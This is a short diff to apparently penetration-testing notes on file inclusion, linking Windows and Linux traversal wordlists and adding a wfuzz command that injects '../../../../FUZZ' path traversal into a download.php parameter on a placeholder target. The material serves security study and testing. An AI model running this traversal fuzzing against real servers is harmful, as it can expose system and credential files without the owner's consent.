@@ -1,10 +1,18 @@
-### :open_file_folder: Windows
+### :open_file_folder: Check file
 
-- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+lists
 
-### :open_file_folder: Linux
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
 
-- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
+
+https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt
+
+Check files
+
+```
+wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=../../../../../../../FUZZ
+```
 
 ### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)
 
